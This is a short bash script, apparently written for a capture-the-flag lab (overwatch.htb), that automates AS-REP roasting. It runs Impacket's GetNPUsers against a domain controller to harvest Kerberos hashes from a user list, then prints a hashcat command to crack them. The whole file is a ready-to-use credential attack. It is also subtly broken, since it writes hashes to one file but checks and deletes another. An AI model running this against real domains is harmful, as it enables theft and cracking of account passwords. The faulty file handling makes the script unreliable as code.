#!/bin/bash
# Template : ASREPRoasting automatique
TARGET=$1
DOMAIN=$2
USER_FILE=$3
OUTPUT="asrepr_hashes.txt"

if [ -z "$USER_FILE" ]; then 
    echo "[-] Usage: $0 <IP_DC> <DOMAIN> <USER_FILE>"
    echo "[-] Exemple: $0 10.129.244.81 overwatch.htb users_anon.txt"
    exit 1
fi

echo "[*] Lancement de l'ASREPRoasting sur $USER_FILE..."

# GetNPUsers va tester chaque utilisateur de la liste
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -usersfile "$USER_FILE" -dc-ip "$TARGET" "$DOMAIN"/

if [ -s "$OUTPUT" ]; then
    NUM_HASHES=$(wc -l < "$OUTPUT")
    echo "[###] VICTOIRE ! $NUM_HASHES hash(es) récupéré(s) dans $OUTPUT"
    echo "[*] Commande de crack : hashcat -m 18200 $OUTPUT /usr/share/wordlists/rockyou.txt"
else
    echo "[-] Aucun compte vulnérable à l'ASREPRoasting."
    rm "$OUTPUT" 2>/dev/null
fi
